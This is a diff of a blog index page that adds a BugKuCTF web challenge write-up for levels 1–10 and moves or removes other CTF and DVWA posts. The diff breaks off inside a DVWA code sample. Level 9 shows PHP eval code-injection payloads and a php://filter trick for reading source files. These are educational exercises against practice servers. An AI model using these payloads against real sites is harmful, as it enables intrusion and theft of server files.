@@ -134,6 +134,159 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-BugKuCTF—Web题 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/03/06/BugKuCTF—Web题 第1-10关/">BugKuCTF — Web题(第1-10关)</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/03/06/BugKuCTF—Web题 第1-10关/" class="archive-article-date">
+  	<time datetime="2019-03-05T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="第一关（web2）"><a href="#第一关（web2）" class="headerlink" title="第一关（web2）"></a>第一关（web2）</h3><p>打开链接后是一堆迎面飞来的“滑稽”表情</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/1-1.png" alt="1-1"></p>
+<p>查看网页源代码后就能发现flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/1-2.png" alt="1-2"></p>
+<h3 id="第二关（计算器）"><a href="#第二关（计算器）" class="headerlink" title="第二关（计算器）"></a>第二关（计算器）</h3><p>尝试输入，却发现只能输入1位数，但是答案明显不止一位数</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/2-1.png" alt="2-1"></p>
+<p>查看源代码，将其中的<code>maxlength</code>修改成3（原本是1）</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/2-2.png" alt="2-2"></p>
+<p>再输入正确答案，就得到了flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/2-3.png" alt="2-3"></p>
+<h3 id="第三关（Web基础-GET）"><a href="#第三关（Web基础-GET）" class="headerlink" title="第三关（Web基础$_GET）"></a>第三关（Web基础$_GET）</h3><p>进入链接后直接看到信息</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/3-1.png" alt="3-1"></p>
+<p>根据信息直接输入url得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?what=flag</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/3-2.png" alt="3-2"></p>
+<h3 id="第四关（Web基础-POST）"><a href="#第四关（Web基础-POST）" class="headerlink" title="第四关（Web基础$_POST）"></a>第四关（Web基础$_POST）</h3><p>同第三关，进入链接后直接看到信息</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/4-1.png" alt="4-1"></p>
+<p>不同的是，这次要用POST方式。在挂上Burpsuit代理之后，刷新网页就会拦截到请求，发送what参数得到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/4-2.png" alt="4-2"></p>
+<h3 id="第五关（矛盾）"><a href="#第五关（矛盾）" class="headerlink" title="第五关（矛盾）"></a>第五关（矛盾）</h3><p>进入连接后直接看到信息</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/5-1.png" alt="5-1"></p>
+<p>为什么题目叫矛盾了，因为要求num即不是数字的同时，却要等于1。这是就想到了科学记数法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1e = 1E = 1*10的0次方</span><br><span class="line">2e1 = 2E1 = 2*10的1次方</span><br><span class="line">3e2 = 3E2 = 3*10的2次方</span><br><span class="line">以此类推.......</span><br></pre></td></tr></table></figure>
+<p>那么我们就能这样提交参数，顺利拿到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1e</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/5-2.png" alt="5-2"></p>
+<h3 id="第六关（web3）"><a href="#第六关（web3）" class="headerlink" title="第六关（web3）"></a>第六关（web3）</h3><p>链接进去后就不断弹出窗口”flag就在这里”，”快来找找吧”</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/6-1.png" alt="6-1"></p>
+<p>谷歌浏览器在多次点击后，弹窗就会消失；火狐浏览器可以直接禁止弹窗跳出。没有弹窗后，直接查看源代码</p>
+<p>在源代码的最后，发现了一串unicode编码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/6-2.png" alt="6-2"></p>
+<p>拿去在线网站转成ASCII一下就得到了flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/6-3.png" alt="6-3"></p>
+<h3 id="第七关（域名解析）"><a href="#第七关（域名解析）" class="headerlink" title="第七关（域名解析）"></a>第七关（域名解析）</h3><p>题目提示：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/7-1.png" alt="7-1"></p>
+<p>那么我们就直接按照他的要求修改hosts文件，hosts文件Windows下的路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+<p>将这条记录添加在下面（注意不要加#号）</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/7-2.png" alt="7-2"></p>
+<p>然后用浏览器访问flag.baidu.com就可以拿到flag了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/7-3.png" alt="7-3"></p>
+<h3 id="第八关（你必须让他停下）"><a href="#第八关（你必须让他停下）" class="headerlink" title="第八关（你必须让他停下）"></a>第八关（你必须让他停下）</h3><p>链接打开是一个一直刷新跳动的网页，提示我们如果能<code>让它停下来</code>就能拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/8-1.png" alt="8-1"></p>
+<p>我们用Burpsuit抓包，用<code>Repeater</code>一直去发包。每go一次，网页最下面都会返回不同的<code>数字.jpg</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/8-2.png" alt="8-2"></p>
+<p>当刷到10.jpg时，flag就跑出来了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/8-3.png" alt="8-3"></p>
+<h3 id="第九关（本地包含）"><a href="#第九关（本地包含）" class="headerlink" title="第九关（本地包含）"></a>第九关（本地包含）</h3><p>链接进去可以看到代码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/9-1.png" alt="9-1"></p>
+<p>首先明确几个知识点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_REQUEST 的意思是获得参数，不论是@$_GET还是@$_POST可以得到的参数@$_REQUEST都能得到</span><br><span class="line"></span><br><span class="line">eval() 函数存在命令执行漏洞，构造出文件包含会把字符串参数当做代码来执行</span><br><span class="line"></span><br><span class="line">file() 函数把整个文件读入一个数组中，并将文件作为一个数组返回</span><br><span class="line"></span><br><span class="line">include()函数和php://input，php://filter结合很好用，php://filter可以用与读取文件源代码，结果是源代码base64编码后的结果</span><br><span class="line">php://filter/convert.base64-encode/resource=文件路径（如index.php）</span><br></pre></td></tr></table></figure>
+<p>方法一：</p>
+<p>把原本的var_dump()函数的括号构造掉，让eval()函数转去执行show_source(‘flag.php’)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8003/?hello=1);show_source(%27flag.php%27);var_dump(1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/9-2.png" alt="9-2"></p>
+<p>网页直接返回flag.php的内容，里面就有flag</p>
+<p>方法二：</p>
+<p>同样用一个右括号把原本的var_dump()函数闭合掉，然后转去执行include $_POST[‘a’]，后面直接用双斜杠注释掉后面的内容，也可以像方法一那样，随便加一个var_dump(1</p>
+<p>然后POST提交a的值如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8003/index.php?hello=1);include $_POST[&apos;a&apos;];//</span><br><span class="line">POST值：a=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/9-3.png" alt="9-3"></p>
+<p>得到一串base64密码，拿去解密一下，就可以看到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/9-4.png" alt="9-4"></p>
+<p>方法三：</p>
+<p>直接将flag.php文件读入变量hello中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=file(&apos;flag.php&apos;)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/9-5.png" alt="9-5"></p>
+<h3 id="第十关（变量1）"><a href="#第十关（变量1）" class="headerlink" title="第十关（变量1）"></a>第十关（变量1）</h3><p>链接进入后可以看到代码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/10-1.png" alt="10-1"></p>
+<p>这个代码大概意思就是，需要通过GET方式提交参数<code>args</code>，并且args的内容只能是【0-9a-zA-Z】，才能执行eval()函数，否则提醒你args error!</p>
+<p>知识点一：<code>可变变量</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/10-2.png" alt="10-2"></p>
+<p>知识点二：<code>$GLOBALS[]</code></p>
+<p>$GLOBALS [一个包含了全部变量的全局组合数组]</p>
+<p>既然只能传入数字、大小写字母，那我们就传入GLOBALS，让var_dump()打印出这个数组的内容</p>
+<p>就可以看到其中一个全局变量，存储着flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/1-10/10-3.png" alt="10-3"></p>
+<hr>
+<p>至此，1-10关的Write-up结束</p>
+<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/03/08/BugKuCTF%E2%80%94Web%E9%A2%98%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/03/06/BugKuCTF—Web题 第1-10关/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-BugKuCTF—杂项题 第11-20关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -447,105 +600,6 @@
 
 
   
-    <article id="post-BugKuCTF—利用Kali分离图片中的隐藏文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">BugKuCTF — 利用Kali分离图片中的隐藏文件</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/" class="archive-article-date">
-  	<time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>在刚开始做CTF的杂项习题时，碰到有些图片会藏着文件</p>
-<p>而这时就需要把图片给提取出来，看到很多题解用到了KALI里面的工具：<strong>Binwalk、dd、foremost</strong>，于是便去了解</p>
-<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>可以借用BUGKU中的这道题，题目地址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip</span><br></pre></td></tr></table></figure>
-<h3 id="一、Binwalk"><a href="#一、Binwalk" class="headerlink" title="一、Binwalk"></a>一、Binwalk</h3><p>Binwalk会分析一张指定的图片</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk ada.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-7.png" alt="6-7"></p>
-<p>像这张图片，发现隐藏着flag.txt</p>
-<p>Binwalk也可以做提取工作，加一个 -e 参数就可以了</p>
-<p>不过也会出差错，最好和foremost、dd结合起来提取更完整的内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e ada.jpg</span><br></pre></td></tr></table></figure>
-<h3 id="二、foremost"><a href="#二、foremost" class="headerlink" title="二、foremost"></a>二、foremost</h3><p>foremost工具是用来分离出图片中隐藏的文件，举上面的栗子</p>
-<p>我们用binwalk确定ada.jpg图片中有隐藏文件后，就可以进行分离</p>
-<p>它会在当前目录下生成一个<strong>output</strong>文件夹，分离出来的文件放在里面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost ada.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-3.png" alt="6-3"></p>
-<h3 id="三、dd"><a href="#三、dd" class="headerlink" title="三、dd"></a>三、dd</h3><p>dd工具也是用来分离的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=ada.jpg of=ada.zip skip=218773 bs=1</span><br></pre></td></tr></table></figure>
-<p><strong>if</strong>：要提取分离的文件</p>
-<p><strong>of</strong>：输出的文件</p>
-<p><strong>skip</strong>：跳转到第218773块后再提取，这个参数可以看binwalk分析出来的数据而决定</p>
-<p><strong>bs</strong>：设置每次读写块的大小为1个字节</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-8.png" alt="6-8"></p>
-<hr>
-<p>这篇文章只做简单的介绍</p>
-<p>如果想要详细具体的命令，每个人需求都不同，根据具体需要，自己去搜索</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF-Misc</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-BugKuCTF—杂项题 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -728,6 +782,105 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/02/26/BugKuCTF—杂项题 第1-10关/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-BugKuCTF—利用Kali分离图片中的隐藏文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">BugKuCTF — 利用Kali分离图片中的隐藏文件</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/" class="archive-article-date">
+  	<time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在刚开始做CTF的杂项习题时，碰到有些图片会藏着文件</p>
+<p>而这时就需要把图片给提取出来，看到很多题解用到了KALI里面的工具：<strong>Binwalk、dd、foremost</strong>，于是便去了解</p>
+<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>可以借用BUGKU中的这道题，题目地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip</span><br></pre></td></tr></table></figure>
+<h3 id="一、Binwalk"><a href="#一、Binwalk" class="headerlink" title="一、Binwalk"></a>一、Binwalk</h3><p>Binwalk会分析一张指定的图片</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk ada.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-7.png" alt="6-7"></p>
+<p>像这张图片，发现隐藏着flag.txt</p>
+<p>Binwalk也可以做提取工作，加一个 -e 参数就可以了</p>
+<p>不过也会出差错，最好和foremost、dd结合起来提取更完整的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e ada.jpg</span><br></pre></td></tr></table></figure>
+<h3 id="二、foremost"><a href="#二、foremost" class="headerlink" title="二、foremost"></a>二、foremost</h3><p>foremost工具是用来分离出图片中隐藏的文件，举上面的栗子</p>
+<p>我们用binwalk确定ada.jpg图片中有隐藏文件后，就可以进行分离</p>
+<p>它会在当前目录下生成一个<strong>output</strong>文件夹，分离出来的文件放在里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost ada.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-3.png" alt="6-3"></p>
+<h3 id="三、dd"><a href="#三、dd" class="headerlink" title="三、dd"></a>三、dd</h3><p>dd工具也是用来分离的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=ada.jpg of=ada.zip skip=218773 bs=1</span><br></pre></td></tr></table></figure>
+<p><strong>if</strong>：要提取分离的文件</p>
+<p><strong>of</strong>：输出的文件</p>
+<p><strong>skip</strong>：跳转到第218773块后再提取，这个参数可以看binwalk分析出来的数据而决定</p>
+<p><strong>bs</strong>：设置每次读写块的大小为1个字节</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-8.png" alt="6-8"></p>
+<hr>
+<p>这篇文章只做简单的介绍</p>
+<p>如果想要详细具体的命令，每个人需求都不同，根据具体需要，自己去搜索</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF-Misc</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">展开全文 >></a>
         </p>
       
 
@@ -1511,114 +1664,6 @@
 
 
   
-    <article id="post-DVWA 6-Insecure CAPTCHA（不安全的验证码）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/15/DVWA 6-Insecure CAPTCHA（不安全的验证码）/">DVWA 6-Insecure CAPTCHA（不安全的验证码）</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/15/DVWA 6-Insecure CAPTCHA（不安全的验证码）/" class="archive-article-date">
-  	<time datetime="2019-02-14T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\captcha\source\</span><br></pre></td></tr></table></figure>
-<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>和CSRF一样的功能：更改密码，但是却要通过验证码（但是由于验证码是由谷歌提供，没有翻墙也就没有验证码）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/6-1.png" alt="6-1"></p>
-<h2 id="解决-reCAPTCHA-API-key-missing-问题"><a href="#解决-reCAPTCHA-API-key-missing-问题" class="headerlink" title="解决 reCAPTCHA API key missing 问题"></a>解决 reCAPTCHA API key missing 问题</h2><p>参考文章：<a href="https://blog.csdn.net/RBPicsdn/article/details/80059132" target="_blank" rel="noopener">https://blog.csdn.net/RBPicsdn/article/details/80059132</a></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/6-2.png" alt="6-2"></p>
-<h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'1'</span> ) ) &#123;</span><br><span class="line">	<span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">	$hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">	$resp = recaptcha_check_answer(</span><br><span class="line">		$_DVWA[ <span class="string">'recaptcha_private_key'</span>],</span><br><span class="line">		$_POST[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">	<span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">		<span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">		$html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">		$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">		<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">			<span class="comment">// Show next stage for the user</span></span><br><span class="line">			$html .= <span class="string">"</span></span><br><span class="line"><span class="string">				&lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">				&lt;form action=\"#\" method=\"POST\"&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"hidden\" name=\"password_new\" value=\"&#123;$pass_new&#125;\" /&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"hidden\" name=\"password_conf\" value=\"&#123;$pass_conf&#125;\" /&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;</span></span><br><span class="line"><span class="string">				&lt;/form&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Both new passwords do not match.</span></span><br><span class="line">			$html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>;</span><br><span class="line">			$hide_form = <span 